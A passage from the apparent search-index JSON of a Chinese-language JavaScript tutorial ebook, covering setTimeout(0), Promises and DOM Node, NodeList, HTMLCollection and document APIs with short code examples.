\u7684\u7279\u6b8a\u7528\u6cd5\uff1a\u8868\u793a\u5f53\u524d\u4e3b\u7ebf\u7a0b\u4efb\u52a1\u6267\u884c\u5b8c\u6bd5\u540e\uff0c\u6267\u884c\u73b0\u5728\u7684\u7a0b\u5e8f\uff08\u4f18\u5316\u6027\u80fd\uff09\uff0c\u4e0d\u540c\u6d4f\u89c8\u5668\u6267\u884c\u7684\u65f6\u95f4\u4e0d\u540c\u3002\u4f8b\u5982\uff0c\u5728\u4e8b\u4ef6\u5192\u6ce1\u4e2d\uff0c\u9996\u5148\u89e6\u53d1\u5b50\u5143\u7d20\u7684\u56de\u8c03\u51fd\u6570\uff0c\u7136\u540e\u89e6\u53d1\u7236\u5143\u7d20\u7684\u56de\u8c03\u51fd\u6570\u3002\u5728\u5b50\u5143\u7d20\u4e0a\u4f7f\u7528setTimeout(0)\u5373\u53ef\u6539\u53d8\u6267\u884c\u7684\u987a\u5e8f\u3002\u4f8b\u59822\uff0cDOM\u6e32\u67d3\u7684\u901f\u5ea6\u6bd4JS\u6267\u884c\u7684\u6162\uff0c\u53ef\u4ee5\u5728JS\u4e2d\u4f7f\u7528\u8fd9\u4e2a\u51fd\u6570\uff0c\u8ba9DOM\u6e32\u67d3\u7ed3\u675f\u540e\u518d\u6267\u884cJS\u4ee3\u7801\u3002</p> <p>\u5728 react \u4e2d\uff0csetTimeout \u7684\u7279\u6b8a\u7528\u6cd5\uff1a\u751f\u547d\u5468\u671f\u51fd\u6570\u4e2d\uff0ccomponentDidMount componentDidUpdate \u662f\u7ec4\u4ef6\u5df2\u7ecf\u52a0\u8f7d\u6216\u8005\u7ec4\u4ef6\u5df2\u7ecf\u66f4\u65b0\uff08\u4f46\u662f\u6b64\u65f6\u754c\u9762 DOM \u53ef\u80fd\u6ca1\u6709\u66f4\u65b0\uff09\u5728\u8fd9\u4e24\u4e2a\u751f\u547d\u5468\u671f\u4e2d\u83b7\u53d6 dom \u7684\u5c5e\u6027\uff0c\u53ef\u80fd\u662f\u4e0d\u6b63\u786e\u7684\u3002\u6240\u4ee5\u53ef\u4ee5\u8bbe\u7f6e\u5b9a\u65f6\u5668\uff0c\u7136\u540e\u65f6\u95f4\u8bbe\u7f6e0\uff0c\u8868\u793a\u5f53\u524dJS\u6267\u884c\u540e\uff08\u5373DOM\u6e32\u67d3\u5b8c\u6210\u540e\uff09\uff0c\u518d\u6267\u884c\u5bf9\u5e94\u7684\u4ee3\u7801\uff0c\u8fd9\u6837\u53ef\u4ee5\u6b63\u786e\u83b7\u53d6 DOM \u7684\u5c5e\u6027\u3002</p>"},{"location":"ebook-JS-basic/07-%E5%BC%82%E6%AD%A5%E6%93%8D%E4%BD%9C/#promise","title":"Promise\u5bf9\u8c61","text":"<p>Promise \u662f\u5f02\u6b65\u64cd\u4f5c\u548c\u56de\u8c03\u51fd\u6570\u7684\u5f88\u597d\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u8fd9\u91cc\u7b80\u5355\u4ecb\u7ecd\uff08\u4e3b\u8981\u5728ES6\uff09</p> <p>\u5f02\u6b65\u4efb\u52a1\u8fd4\u56de\u4e00\u4e2a Promise \u5b9e\u4f8b\uff0c\u8fd9\u4e2a\u5b9e\u4f8b\u5177\u6709 then \u7684\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5904\u7406\u4e0b\u4e00\u6b65\u7684\u56de\u8c03\u51fd\u6570\u3002Promise \u7b80\u5316\u4e86\u56de\u8c03\u51fd\u6570\u7684\u5199\u6cd5\u3002</p> <pre><code>function f1 (resolve, reject) {\n  // deal with async event\n}\n\nlet a = new Promise(f1);\na.then((res) =&gt; {\n  console.log(res);\n  // deal with response\n});\n</code></pre> <p>\u4f20\u7edf\u5199\u6cd5\u548c Promise \u5199\u6cd5\uff0c\u56de\u8c03\u51fd\u6570\u53d8\u6210\u94fe\u5f0f\u51fd\u6570</p> <pre><code>f1(function(value1) {\n  f2(value1, function(value2) {\n    //\n  });\n});\n\n(new Promise(f1)).then(f2).then(f3)...\n</code></pre> <p>Promise \u5b9e\u4f8b\u5bf9\u8c61\u7684\u72b6\u6001\uff08\u5bf9\u5e94ajax\u8bf7\u6c42\u5bf9\u8c61\u7684\u72b6\u6001\uff09\uff0c\u7ed3\u679c\u53ef\u80fd\u662f\u4e24\u4e2a\uff0c\u6210\u529f\u6216\u8005\u5931\u8d25\uff08\u6210\u529f\u8fd4\u56de result\uff0c \u5931\u8d25\u8fd4\u56de error\uff0c\u5982\u679c\u53d1\u51fa\u5f02\u6b65\u90a3\u4e48\u7ed3\u679c\u4e00\u5b9a\u4f1a\u53d1\u751f\uff0c\u6240\u4ee5\u79f0\u4e3a\u627f\u8bfa\uff09</p> <p>Promise.prototype.then \u53ef\u4ee5\u4e3a\u5f02\u6b65\u4e8b\u4ef6\u6dfb\u52a0\u56de\u8c03\u51fd\u6570\uff0c\u4f8b\u5982\u4e0b\u9762\u7684\u56fe\u7247\u52a0\u8f7d</p> <pre><code>var preloadImage = function(path) {\n  return new Promise(function(resolve, reject) {\n    var image = new Image();\n    image.onload = resolve;\n    image.onerror = reject;\n    image.src = path;\n  });\n};\n\npreloadImage('https://example.com/my.jpg').then((e) =&gt; {\n  document.body.append(e.target)\n}).then(() =&gt; {\n  console.log('\u52a0\u8f7d\u6210\u529f')\n});\n</code></pre>"},{"location":"ebook-JS-basic/08-DOM/","title":"08-DOM","text":""},{"location":"ebook-JS-basic/08-DOM/#dom","title":"\u7b2c\u516b\u7ae0 DOM","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 28467  \u9605\u8bfb57\u5206\u949f</p> <p>2021-11-22 2023-04-11</p> <p>\u8fd9\u4e2a\u6587\u6863\u7ec6\u8282\u5f88\u591a\uff0c\u5de5\u4f5c\u4e2d\u4e3b\u8981\u662f\u6846\u67b6\uff0c\u76f4\u63a5\u64cd\u4f5c DOM \u7684\u60c5\u51b5\u8d8a\u6765\u8d8a\u5c11</p>"},{"location":"ebook-JS-basic/08-DOM/#81","title":"8.1 \u6982\u5ff5","text":"<p>DOM\uff08\u6587\u6863\u5bf9\u8c61\u6a21\u578b\uff09\u4f5c\u7528\u662f\u628a\u7f51\u9875\uff08HTML\uff09\u5b57\u7b26\u4e32\uff0c\u89e3\u6790\u6210 JS \u53ef\u4ee5\u5904\u7406\u7684 DOM \u6811\u3002\u6d4f\u89c8\u5668\u6807\u7b7eHTML\uff0c\u8f6c\u6362\u6210Node\u8282\u70b9\u6811 JS\u624d\u80fd\u64cd\u4f5c\u3002</p> <p>DOM \u6811\u6700\u5c0f\u7684\u5355\u4f4d\u662f node \u8282\u70b9\u3002\u6d4f\u89c8\u5668\u63d0\u4f9b\u4e86\u539f\u751f\u7684\u5bf9\u8c61 Node\u3002\u5b9e\u9645\u7684 DOM \u6811\u8282\u70b9\u67097\u7c7b\uff0c\u90fd\u7ee7\u627f\u81ea Node \u8282\u70b9\u3002\u6700\u5927\u7684\u6839\u8282\u70b9\u662f Document\uff0c \u6d4f\u89c8\u5668\u4e2d\u5404\u79cd\u6807\u7b7e\uff08span\uff09\u662f Element\uff0c \u6bcf\u4e2a\u8282\u70b9\u5177\u6709\u5c5e\u6027 Attribute\uff0c\u6807\u7b7e\u5185\u90e8\u7684\u6587\u672c\u662f Text\uff0c\u6ce8\u91ca\u662f Comment \u8282\u70b9\u3002\u6587\u6863\u7247\u6bb5\u662f DocumentFragment\uff0c\u6700\u540e\u662f DocumentType \u8868\u793a doctype \u6807\u7b7e\uff08\u8bf4\u660eHTML\u7684\u89c4\u8303\uff09</p> <p>\u5168\u90e8\u8282\u70b9\u6309\u7167\u6811\u72b6\u7ed3\u6784\u6392\u5217\u5c31\u662f Document DOM \u6811\u3002\u53ef\u4ee5\u4f7f\u7528 parentNode, firstChild, lastChild, nextSibling, previousSibling \u83b7\u53d6\u4efb\u610f\u8282\u70b9\u3002</p> <p>\u5bf9\u4e8e\u539f\u751f JS \u64cd\u4f5cnode\u662f\u5f88\u91cd\u8981\u7684\uff0c\u5bf9\u4e8eReact\uff0c\u4e0d\u9700\u8981\u76f4\u63a5\u64cd\u4f5cnode\uff0c\u76f4\u63a5\u4f7f\u7528\u72b6\u6001\u9a71\u52a8UI\u754c\u9762\u5373\u53ef\uff08\u64cd\u4f5c\u754c\u9762\uff0c\u754c\u9762\u6eda\u52a8\u52a8\u753b\u7b49\u4e5f\u9700\u8981DOM\uff09\u3002</p>"},{"location":"ebook-JS-basic/08-DOM/#82-node-api","title":"8.2 Node API","text":"<p>\u6240\u6709\u7684\u8282\u70b9\u90fd\u7ee7\u627f\u81ea Node \u8282\u70b9\uff0c\u6240\u4ee5\u6240\u6709\u7684\u8282\u70b9\u90fd\u53ef\u4ee5\u7ee7\u627f Node \u8282\u70b9\u7684 APIs\u3002\u4e0b\u9762\u662f\u5e38\u7528\u539f\u578b\u4e0a\u7684API\u3002</p> <p>\u5c5e\u6027</p> <pre><code>Node.prototype.nodeType // \u8fd4\u56de\u4e00\u4e2a\u6570\u503c\uff0c\u8868\u793a\u8282\u70b9\u7684\u7c7b\u578b(\u8282\u70b9\u5c5e\u6027\u6587\u672c\u5bf9\u5e94123)\nNode.prototuype.nodeName // \u8fd4\u56de\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8282\u70b9\u7684\u540d\u79f0(div #text)\nNode.prototype.nodeValue // \u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8282\u70b9\u7684\u503c(\u6587\u672c\u8282\u70b9\u3001\u5c5e\u6027\u8282\u70b9\u3001\u6ce8\u91ca\u8282\u70b9\u5177\u6709\u8fd9\u4e2a\u5c5e\u6027)\uff0c\u5982\u679c\u5185\u90e8\u662f\u7a7a\uff0c\u8fd4\u56denull,\u8fd9\u4e2a\u503c\u53ef\u4ee5\u6539\u53d8\n\ntextContent // \u8fd4\u56de\u5f53\u524d\u8282\u70b9\u548c\u6240\u6709\u5b50\u8282\u70b9\u7684\u6587\u672c\u5185\u5bb9\ndocument.textContent === null \ndocument.documentElement.textContent //\u53ef\u4ee5\u83b7\u53d6\u6574\u4e2a\u6587\u6863\u7684\u5185\u5bb9\uff08\u5b9e\u9645\u4e0a\u83b7\u53d6\u4e0d\u5168\uff09\n\nbaseURL // \u8fd4\u56de\u4e00\u4e2a\u7edd\u5bf9\u8def\u5f84(\u7531window.location\u51b3\u5b9a),\u5c5e\u6027\u53ea\u8bfb\uff0c\u6d4f\u89c8\u5668\u6839\u636e\u8fd9\u4e2a\u5c5e\u6027\u8ba1\u7b97\u76f8\u5bf9\u8def\u5f84\nownerDocument // \u8fd4\u56de\u5f53\u524d\u8282\u70b9\u7684\u6839\u8282\u70b9document\uff0cdocument.ownerDocument === null\n\nnextSibling, previousSibling \n//\u8fd4\u56de\u76f8\u90bb\u8282\u70b9(\u5982\u679c\u6ca1\u6709\u76f8\u90bb\u8282\u70b9\u8fd4\u56denull, \u53ef\u80fd\u4e00\u4e2a\u5143\u7d20\u8282\u70b9\u7684\u76f8\u90bb\u8282\u70b9\u662f\u6587\u672c\u8282\u70b9\u6216\u8005\u6ce8\u91ca\u8282\u70b9)\n\nparentNode // \u53ea\u6709\u4e09\u79cd\u60c5\u51b5 Element, Document, DocumentFraggment\nparentElement // \u7236\u5143\u7d20 element\nfirstChild lastChild // \u8fd4\u56de\u5b50\u5143\u7d20\u4e2d\u7684\u7b2c\u4e00\u4e2a\u6216\u8005\u6700\u540e\u4e00\u4e2a(\u53ef\u80fd\u662f\u6587\u672c\u6ce8\u91ca\u6216\u8005\u7a7a)\nchildNodes // \u8fd4\u56de\u6240\u6709\u5b50\u8282\u70b9\u7684\u96c6\u5408\nisConnected // \u5f53\u524d\u8282\u70b9\u662f\u5426\u5728\u6587\u6863\u4e2d(\u53ef\u80fd\u6ca1\u6709\u63d2\u5165\u6587\u6863\u4e2d)\n</code></pre> <p>\u65b9\u6cd5</p> <ul> <li> <p>1 document.body.appendChild(p) // \u5982\u679cp\u662f\u65b0\u5efa\u7684DOM\uff0c\u76f4\u63a5\u5728body\u540e\u9762\u63d2\u5165\u3002\u5982\u679cp\u662f\u5df2\u6709\u7684DOM\u8282\u70b9\uff0c\u5c31\u662f\u628a\u8fd9\u4e2a\u8282\u70b9\u79fb\u52a8\u5230body\u540e\u9762\u3002\u8fd4\u56de\u503c\u662f\u63d2\u5165\u6587\u6863\u7684\u5b50\u8282\u70b9\u3002\u5982\u679c\u4f20\u5165\u7684\u53c2\u6570\u662f DocumentFragment\uff0c\u90a3\u4e48\u63d2\u5165\u7684\u662f\u5168\u90e8\u7684\u6587\u6863\u7247\u6bb5\uff0c\u8fd4\u56de\u503c\u662f\u7a7a\u7684DocumentFragment\u7247\u6bb5\u3002</p> </li> <li> <p>2 hasChildNodes \u5224\u65ad\u5f53\u524d\u8282\u70b9\u662f\u5426\u6709\u5b50\u8282\u70b9(\u5305\u62ec\u6240\u6709\u7c7b\u578b\u7684\u8282\u70b9\uff0c\u4e0d\u4ec5\u4ec5\u662f\u6587\u6863\u8282\u70b9)</p> </li> </ul> <p>\u5224\u65ad\u4e00\u4e2a\u8282\u70b9\u662f\u5426\u5177\u6709\u5b50\u8282\u70b9\u7684\u4e09\u79cd\u65b9\u6cd5</p> <p><pre><code>node.hasChildNodes()\nnode.firstChild !== null\nnode.childNodes &amp;&amp; node.childNodes.length === 0\n</code></pre> - 3 node.cloneNode() \u514b\u9686\u4e00\u4e2a\u8282\u70b9(\u53c2\u6570\u662ftrue\u3001false\uff0c\u8868\u793a\u514b\u9686\u81ea\u8eab\u6216\u8005\u514b\u9686\u5168\u90e8\u5b50\u8282\u70b9)\uff0c\u53ef\u4ee5\u514b\u9686\u5168\u90e8\u5c5e\u6027\uff0c\u4f46\u662f\u4f1a\u5931\u53bb\u4e8b\u4ef6\u76d1\u542c(\u56de\u8c03\u51fd\u6570)\u3002\u514b\u9686\u540e\u7684\u8282\u70b9\u6ca1\u6709\u7236\u8282\u70b9\uff0c\u9700\u8981\u624b\u52a8append\u5230\u8282\u70b9\u6811\u4e2d\u3002\u5982\u679c\u514b\u9686\u540e\u6709\u4e24\u4e2aname\u6216\u8005ID\u9700\u8981\u6539\u53d8\u5176\u4e2d\u7684\u4e00\u4e2a\u3002</p> <ul> <li> <p>4 parentNode.insertBefore(newNode, referNode); \u65b0\u8282\u70b9\u4f1a\u63d2\u5165\u5230\u7236\u8282\u70b9\u4e2d\uff0c\u63d2\u5165\u5230referNode\u4e4b\u524d\u3002\u8fd4\u56de\u503c\u662f\u63d2\u5165\u7684\u8282\u70b9\u3002\u5982\u679c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662fnull\uff0c\u5c31\u63d2\u5165\u5230\u6700\u540e\u7684\u4f4d\u7f6e\u3002</p> </li> <li> <p>5 parentNode.removeChild(childNode) \u53ef\u4ee5\u79fb\u9664\u4e00\u4e2a\u8282\u70b9\u7684\u5168\u90e8\u5b50\u8282\u70b9</p> </li> </ul> <pre><code>while(element.firstChild) {\n  element.removeChild(element.firstChild)\n}\n</code></pre> <ul> <li>6 replaceChild(newNode, oldNode)</li> <li>7 node.contains(childNode); \u662f\u5426\u662f\u5f53\u524d\u8282\u70b9\u3001\u5b50\u8282\u70b9\u3001\u540e\u4ee3\u8282\u70b9</li> <li>node.compareDocumentPosition(another node) \u5224\u65ad\u4e24\u4e2a\u8282\u70b9\u7684\u76f8\u5bf9\u4f4d\u7f6e(\u8fd4\u56de\u4e00\u4e2a\u6570\u503c)</li> <li>isEqualNode \u5224\u65ad\u4e24\u4e2a\u8282\u70b9\u7684\u7c7b\u578b\u5c5e\u6027\u5b50\u8282\u70b9\u662f\u5426\u4e00\u81f4</li> <li>isSameNode \u5224\u65ad\u4e24\u4e2a\u8282\u70b9\u662f\u5426\u5b8c\u5168\u4e00\u81f4</li> <li>normalize \u6e05\u7406\u8282\u70b9\u5185\u90e8\u7684\u6587\u672c\u8282\u70b9(\u4f1a\u53bb\u6389\u7a7a\u6587\u672c\u8282\u70b9\uff0c\u5c06\u76f8\u90bb\u7684\u6587\u672c\u8282\u70b9\u5408\u5e76)</li> <li>getRootNode \u83b7\u53d6\u6587\u6863\u7684\u6839\u8282\u70b9(\u7c7b\u4f3c\u4e8e\u5c5e\u6027ownerDocument,\u65b9\u6cd5\u53ef\u4ee5\u4f7f\u7528\u5728document\u81ea\u8eab\u4e0a\u9762)</li> </ul>"},{"location":"ebook-JS-basic/08-DOM/#83-api","title":"8.3 \u8282\u70b9\u96c6\u5408 API","text":"<p>Node \u662f\u5355\u4e2a\u8282\u70b9\uff0c\u591a\u4e2a\u8282\u70b9\u96c6\u5408\u53ef\u4ee5\u5206\u4e3a NodeList \u548c HTMLCollection\uff0c\u524d\u8005\u5305\u62ec\u5404\u79cd\u7c7b\u578b\u8282\u70b9\uff0c\u540e\u8005\u5305\u62ecHTML\u5143\u7d20\u8282\u70b9\u3002</p> <p>NodeList API</p> <p>\u7c7b\u4f3c\u4e8e\u6570\u7ec4\uff0cNode.childNodes document.querySelectorAll() \u53ef\u4ee5\u83b7\u53d6\uff1b\u7ed3\u679c\u662f\u4e00\u4e2a\u4f2a\u6570\u7ec4\uff0c\u5177\u6709 length \u548c forEach\uff0c for\u5faa\u73af\uff0c\u4f46\u662f\u4e0d\u5177\u6709\u6570\u7ec4\u7684\u5176\u4ed6\u5c5e\u6027\u65b9\u6cd5\uff0c\u53ef\u4ee5\u4f7f\u7528call\uff0capply \u65b9\u6cd5\u5c06\u5176\u8f6c\u5316\u6210\u6570\u7ec4\u3002</p> <p><code>let children = document.body.childNodes; Array.prototype.slice.call(children);</code></p> <p>\u6ce8\u610f\uff1a\u7ed3\u679c\u53ef\u80fd\u662f\u4e00\u4e2a\u52a8\u6001\u5b9e\u4f8b\uff1a\u83b7\u53d6\u540e\uff0c\u5982\u679cDOM\u53d1\u751f\u53d8\u5316\uff0c\u90a3\u4e48\u5c5e\u6027\u4e5f\u4f1a\u53d1\u751f\u53d8\u5316\u3002</p> <pre><code>children.forEach((item, index, children) =&gt; {\n  console.log(item);\n});\n\nchildren.length\n\nchilfren.item(0) \u8fd4\u56de\u7d22\u5f15\u4f4d\u7f6e\u7684\u5b50\u8282\u70b9\n\nvalues\uff0ckeys, entries \u8fd4\u56de\u7684\u662fES6\u7684\u904d\u5386\u5668\n\nfor (let entry of children.entries()) {\n  console.log(entry);\n  // Array [ 1, &lt;script&gt; ]\n}\n</code></pre> <p>HTMLCollection API</p> <p>\u4e0d\u80fd\u4f7f\u7528forEach \u904d\u5386 document.links document.forms document.images</p> <p>\u5982\u679c\u67d0\u4e2a\u5143\u7d20\u5177\u6709id\u6216\u8005name\u5c5e\u6027\uff0c\u90a3\u4e48\u53ef\u4ee5\u901a\u8fc7\u70b9\u8bed\u6cd5\u83b7\u53d6\u8fd9\u4e2a\u8282\u70b9</p> <p><code>document.getElementById('pic') === document.iamges.pic</code></p> <pre><code>HTMLCollection.length\nHTMLCollection.item(1)\nHTMLCollection.nameItem('pic') \n// &lt;img id=\"pic\" src=\"http://example.com/foo.jpg\"&gt;\n</code></pre>"},{"location":"ebook-JS-basic/08-DOM/#84","title":"8.4 \u7236\u5b50\u8282\u70b9","text":"<p>parentNode childNode</p> <p>\u62e5\u6709\u5b50\u8282\u70b9\u7684Node\u624d\u80fd\u7ee7\u627f parentNode \u7684\u5c5e\u6027\uff08Element\uff0cdocument\uff0c DocumentFragment\uff09</p> <pre><code>parentNode.children\nparentNode.firstElementNode\nparentNode.lastElementNode\nparentNode.childElementCount === 10\nparentNode.append(div, 'hello'); //\u52a0\u5230\u6700\u540e\u4e00\u4e2a\u8282\u70b9\u540e\u9762\nparentNode.prepend(); // \u52a0\u5230\u6700\u524d\u9762\u8282\u70b9\n</code></pre> <p>\u5b50\u8282\u70b9</p> <pre><code>node.remove()\nnode.before(div);\nnode.after(div);\nnode.replaceWith(newNode);\n</code></pre>"},{"location":"ebook-JS-basic/08-DOM/#85","title":"8.5 \u6587\u6863\u8282\u70b9","text":"<p>Document Node</p> <p>document \u8868\u793a\u6574\u4e2a\u6587\u6863\uff0c\u53ef\u4ee5\u4f7f\u7528 window.document \u6216\u8005 document \u83b7\u53d6\u5bf9\u8c61\u3002document \u7ee7\u627f\u4e86 Node ParentNode EventTarget \u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002\u4e0b\u9762\u662f\u5e38\u7528\u7684\u5c5e\u6027\u548c\u65b9\u6cd5</p> <p>\u5c5e\u6027</p> <p>\u5e38\u89c1\u5c5e\u6027</p> <pre><code>document.default === window //\u8fd4\u56dewindow\u5bf9\u8c61(\u5982\u679c\u4e0d\u662fwindow\u7684document\u5c31\u8fd4\u56denull\uff0c\u4f8b\u5982 Ajax \u6216\u8005 iframe \u521b\u5efa\u7684document\uff0c\u5f88\u5c11\u7528\u5230)\ndocument.doctype // \u662f\u4e00\u4e2a\u5bf9\u8c61 \"&lt;!DOCTYPE html&gt;\"\ndocument.doctype.name === 'html' // \u8fd4\u56de\u6587\u6863\u7c7b\u578b\ndocument.documentElement // \u8fd4\u56deHTML\u8282\u70b9\ndocument.body\ndocument.head\ndocument.scrollingElement =&gt;\u8fd4\u56de\u5f53\u524d\u6eda\u52a8\u7684\u5143\u7d20\ndocument.activeElement =&gt;\u8fd4\u56de\u5f53\u524d\u6d3b\u52a8\u7684\u5143\u7d20(\u83b7\u53d6\u7126\u70b9\u7684input\u8868\u5355\u7b49)\ndocument.fullscreenElement.nodeName === 'VIDEO' \u5f53\u524d\u5168\u5c4f\u7684\u5143\u7d20(\u5982\u679c\u662fvideo\uff0c\u8bc1\u660e\u7528\u6237\u5728\u5168\u5c4f\u89c2\u770b\u89c6\u9891\u7b49)\n</code></pre> <p>\u8282\u70b9\u96c6\u5408\u5c5e\u6027</p> <p>\u4e0b\u9762\u7684\u5c5e\u6027\u8fd4\u56de\u6587\u6863\u7684\u8282\u70b9\u7ec4\u5408\u52a8\u6001\u96c6\u5408\uff08\u5982\u679c\u5185\u90e8\u8282\u70b9\u53d8\u5316\uff0c\u8fd4\u56de\u503c\u4e5f\u4f1a\u968f\u65f6\u66f4\u65b0\uff09\u8fd9\u662f\u5f15\u7528\u7c7b\u578b\u6570\u636e</p> <pre><code>document.links\ndocuments.forms\ndocument.images\ndocument.plugins\ndocument.embeds\n// \u4e0a\u9762\u90fd\u8fd4\u56de\u4e00\u4e2a HTMLCollection\ndocument.styleSheets\n</code></pre> <p>\u6587\u6863\u9759\u6001\u4fe1\u606f\u5c5e\u6027</p> <pre><code>document.URL\ndocument.documentURL\n// \u5982\u679canchor\u53d8\u5316\uff0c\u90a3\u4e48\u8fd9\u4e24\u4e2a\u5c5e\u6027\u90fd\u4f1a\u53d1\u751f\u53d8\u5316\ndocument.domain \u8fd4\u56de\u5f53\u524d\u6587\u6863\u7684\u57df\u540d\uff0c\u4e0d\u5305\u62ec\u534f\u8bae\u548c\u7aef\u53e3\ndocument.location \u5f88\u5e38\u7528\ndocument.lastModified \u6700\u8fd1\u66f4\u6539\u7684\u65f6\u95f4\ndocument.title\ndocument.characteret\ndocument.referrer\ndocument.dir \ndocument.compatMode // \u517c\u5bb9\u6a21\u5f0f\u6216\u8005\u4e25\u683c\u6a21\u5f0f\n</code></pre> <p>\u6587\u6863\u72b6\u6001\u5c5e\u6027</p> <ul> <li>document.hidden // \u5f53\u524d\u754c\u9762\u662f\u5426\u6700\u5c0f\u5316(\u6216\u8005\u5176\u4ed6tab\u6d3b\u52a8)</li> <li>document.visibilityState // \u6587\u6863\u53ef\u89c1\u72b6\u6001(\u5728\u6e32\u67d3\u7684\u54ea\u4e2a\u9636\u6bb5)\uff1f\u7ed3\u679c\u662f\u53ef\u89c1\u3001\u4e0d\u53ef\u89c1\u3001\u6b63\u5728\u6e32\u67d3\u3001\u5df2\u7ecf\u5378\u8f7d</li> <li>document.readyState // loading(\u52a0\u8f7dHTML) interactive(HTML\u52a0\u8f7d\u5b8c\u6bd5\uff0c\u52a0\u8f7d\u5916\u90e8\u7684\u56fe\u7247CSS) complete(\u52a0\u8f7d\u5b8c\u6bd5)\uff0c\u72b6\u6001\u6539\u53d8\u4f1a\u89e6\u53d1 readystatechange \u4e8b\u4ef6\uff0c\u5728\u9996\u5c4f\u4f18\u5316\u529f\u80fd\u4f1a\u7528\u5230\u8fd9\u90e8\u5206\u3002</li> <li>document.cookie</li> <li>document.designMode //\u6587\u6863\u7684\u7f16\u8f91\u6a21\u5f0f(\u5982\u679c'on'\uff0c\u754c\u9762\u4e2d\u53ef\u7f16\u8f91HTML)\uff0c\u8fd9\u6837\u5bf9\u4e8e\u8c03\u8bd5\u754c\u9762\u622a\u5c4f\u5f88\u5e38\u7528</li> <li>document.implemention //\u8fd4\u56de\u4e00\u4e2aDOMImplemention\u5bf9\u8c61\uff0c\u53ef\u4ee5\u521b\u5efa\u65b0\u7684XML</li> </ul> <p>\u65b9\u6cd5</p> <pre><code>document.open(); \u6e05\u9664\u6587\u6863\u5f53\u524d\u5185\u5bb9(\u754c\u9762\u4f1a\u7a7a\u767d)\uff0c\u6587\u6863\u6210\u4e3a\u53ef\u5199\u72b6\u6001\ndocument.close(); \u5173\u95ed open \u65b9\u6cd5\u6253\u5f00\u7684\u6587\u6863\u3002\ndocument.write('hello'); \u5728\u754c\u9762\u4e2d\u5199\u5165HTML(\u5982\u679c\u754c\u9762\u4e2d\u5df2\u6709\u5185\u5bb9\uff0c\u9996\u5148\u6267\u884copen\u65b9\u6cd5\u6e05\u7a7a\u754c\u9762)\ndocument.writeln('hello'); \u7c7b\u4f3c\u4e0a\u9762\u7684\u65b9\u6cd5\n\ndocument.querySelector();\ndocument.querySelectorAll(); \u52a0\u5165CSS\u9009\u62e9\u5668\uff0c\u9009\u62e9\u7b26\u5408\u6807\u51c6\u7684\u7b2c\u4e00\u4e2a\u6216\u8005\u5168\u90e8DOM\u5bf9\u8c61(\u4e0d\u652f\u6301\u4f2a\u5143\u7d20\u548c\u4f2a\u7c7b\u9009\u62e9\u5668)\u8fd4\u56de\u7684\u7ed3\u679c\u662f\u9759\u6001\u7684\u8282\u70b9\uff0c\u4e0d\u4f1a\u968f\u7740\u754c\u9762\u53d8\u5316\u800c\u53d8\u5316\ndocument.querySelectorAll('DIV:not(.ignore)'); // \u9009\u4e2ddiv\u5143\u7d20\uff0c\u90a3\u4e9b class \u542b ignore \u7684\u9664\u5916\ndocument.getElementsByTagName('p')\ndocument.getElementsByClassName('foo bar');\n\u6ce8\u610f\uff1aHTML\u6807\u7b7e\u5bf9\u4e8e\u5927\u5c0f\u5199\u4e0d\u654f\u611f\uff0c\u4f46\u662fCSS\u7c7b\u540d\u5bf9\u4e8e\u5927\u5c0f\u5199\u654f\u611f(\u7c7b\u540d\u9009\u62e9\u5668\u66f4\u91cd\u8981)\ngetElementsByName('x') \u83b7\u53d6HTML\u4e2dname\u662fx\u7684\u5143\u7d20\u7ec4\u5408  &lt;form name=\"x\"&gt;&lt;/form&gt;\ngetElementById('wrap'); \u8fd9\u4e2a\u6548\u7387\u6bd4 querySelectorAll('#wrap')\u6548\u7387\u9ad8\u5f88\u591a\n\ndocument.elementFromPoint(50, 50) \u83b7\u53d6\u754c\u9762\u4e2d\u5750\u6807\u4f4d\u7f6e\u7684\u6700\u4e0a\u5c42\u5143\u7d20\ndocument.elementsFromPoint(50, 50) \u83b7\u53d6\u754c\u9762\u4e2d\u5750\u6807\u4f4d\u7f6e\u7684\u5168\u90e8\u5143\u7d20\ndocument.caretPositionFromPoint() \u8fd4\u56de\u4e00\u4e2aCaretPosition\u5bf9\u8c61\uff0c\u5305\u542b\u4e86\u6307\u5b9a\u5750\u6807\u70b9\u5728\u8282\u70b9\u5bf9\u8c61\u5185\u90e8\u7684\u4f4d\u7f6e\u4fe1\u606f\ndocument.createElement('div') \u8fd9\u91cc\u53ef\u4ee5\u4f7f\u81ea\u5b9a\u4e49\u7684\u6807\u7b7e\u540d\uff0c\u4e0d\u80fd\u5305\u542b\u5c16\u62ec\u53f7\ndocument.createTextNode('Hello') \u521b\u5efa\u4e00\u4e2a\u6587\u672c\u8282\u70b9\uff0c\u8fd4\u56de\u7684\u8282\u70b9\u662f\u6587\u672c\u8282\u70b9(\u4e0d\u662fHTML)\u6240\u4ee5\u53ef\u4ee5\u5f88\u597d\u7684\u5904\u7406XSS\uff0c\u5c55\u793a\u7528\u6237\u7684\u8f93\u5165\uff0c\u4f1a\u5bf9\u7279\u6b8a\u7b26\u53f7\u8fdb\u884c\u8f6c\u4e49\uff0c\u5373\u4f7f\u542b\u6709\u6076\u610f\u4ee3\u7801\u4e5f\u4e0d\u4f1a\u51fa\u73b0XSS\u653b\u51fb\u3002\u4e0d\u80fd\u5bf9\u53cc\u5f15\u53f7\u8f6c\u4e49\ncreateAttribute('name') \u521b\u5efa\u5c5e\u6027\u540d\nsetAttribute('name', \"Mike\") \u8bbe\u7f6e\u5c5e\u6027\u540d\n\nlet a = document.createAttribute('name');\na.value = 'Michael';\n\u7b49\u4ef7\u4e8e\ndocument.setAttribute('name', \"Michael\");\ncreateComment \u8fd4\u56de\u4e00\u4e2a\u6ce8\u91ca\u8282\u70b9\uff0c\u4f20\u5165\u7684\u662f\u5b57\u7b26\u4e32\nvar documentFragment = document.createDocumentFragment(); 